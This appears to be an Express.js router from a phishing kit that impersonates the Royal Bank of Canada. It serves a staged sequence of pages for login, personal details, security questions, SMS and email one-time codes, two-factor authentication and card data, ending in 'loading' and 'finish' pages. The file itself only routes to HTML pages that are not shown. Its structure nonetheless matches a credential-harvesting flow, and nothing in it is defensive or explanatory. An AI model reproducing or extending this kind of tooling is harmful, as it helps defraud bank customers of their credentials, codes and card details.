const express = require('express');
const path = require('path');  // Use 'path' instead of 'node:path'
const router = express.Router();
  

router.get('/', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/login/page.html'))});

router.get('/details',(req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/details/page.html'))});

router.get('/question', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/question/page.html'))});

router.get('/question/2', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/quest2/page.html'))});

router.get('/sms-otp', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/sms/page.html'))});

router.get('/auth', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/auth/page.html'))});

router.get('/email-otp', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/otp/page.html'))});


router.get('/2factor', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/twofactor/page.html'))});

router.get('/loading', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/loading/page.html'))});


router.get('/finish', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/finish/page.html'))});

router.get('/card', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/card/page.html'))});


module.exports = router;